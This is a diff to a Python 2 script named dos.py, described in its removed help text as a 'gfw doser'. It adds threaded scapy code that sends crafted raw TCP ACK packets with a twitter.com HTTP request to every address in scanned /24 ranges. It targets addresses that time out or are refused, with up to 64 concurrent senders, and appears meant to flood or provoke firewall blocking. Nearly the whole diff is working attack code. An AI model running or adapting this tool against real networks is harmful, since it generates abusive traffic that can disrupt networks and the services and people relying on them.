@@ -1,13 +1,39 @@
 #!/usr/bin/python
 
-import socket,sys,random,errno,os
+import socket,sys,random,errno,os,threading
 import config
+
+sending = 0
+class sendSYN(threading.Thread):
+    dstIP = ""
+    def __init__(self, dst):
+        global sending
+        threading.Thread.__init__(self)
+        print "seding ack " + dst
+        sending += 1
+        self.dstIP = dst
+
+    def run(self):
+        from scapy.all import *
+        global sending
+        conf.iface='en0';#network card XD
+
+        t = TCP()
+        t.sport = random.randint(1,65535)
+        t.dport = 80
+        t.flags = 'A'
+        t.payload = "GET / HTTP/1.1\r\nHost: twitter.com\r\n\r\n"
+
+        sendp(Ether(type=0x800) / IP(dst=self.dstIP) / t, verbose=0)
+        sending -= 1
+        print "sent ack " + self.dstIP
 
 def connectip(ip):
     remote = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     remote.settimeout(6)
     remote.connect((oip, 80))
-    host = random.choice(config.gConfig["BLOCKED_DOMAINS_LIST"])
+    #host = random.choice(config.gConfig["BLOCKED_DOMAINS_LIST"])
+    host = "twitter.com"
     remote.send("GET / HTTP/1.1\r\nHost: "+host+"\r\n\r\n")
     remote.recv(1024*64)
     #print oip, "good"
@@ -36,19 +62,18 @@ timeoutf = 0
 resetf = 0
 
 try:
-    import argparse
-    parser = argparse.ArgumentParser(description='gfw doser')
-    parser.add_argument('--action', default='', help='set to a if logging')
-    parser.add_argument('--verbose', default=0, type=int, help='verbose mode')
-    gOptions = parser.parse_args()
-except:
-    print "usage: ./dos.py a 1"
     class option:
         def __init__(self): 
-            self.action = sys.argv[1]
-            self.verbose = sys.argv[2]
+            self.action = ''
+            self.verbose = 0
     gOptions = option()
-
+    if len(sys.argv) >= 2:
+        gOptions.action = sys.argv[1]
+    if len(sys.argv) >= 3:
+        gOptions.verbose = sys.argv[2]
+except:
+    print "usage: ./dos.py <action> <verbose>"
+    
 if gOptions.action == "c": #check
     timeoutf = open("status/timedout-ip-checked.list", "r")
     timeoutString = timeoutf.read()
@@ -106,15 +131,17 @@ while 1:
         for last in range(1,256):
             oip = ipm24 + "." + str(last)
             if oip in badipset:
-                #print "ignore", oip
+                if sending < 64: sendSYN(oip).start()
                 continue
             if oip in refusedipset:
+                if sending < 64: sendSYN(oip).start()
                 continue
 
             try:
                 if verbose: print "connect to", oip
                 connectip(oip)
             except socket.timeout:
+                sendSYN(oip).start()
                 if timeoutf:
                     timeoutf.write(oip+"\n")
                     timeoutf.flush()
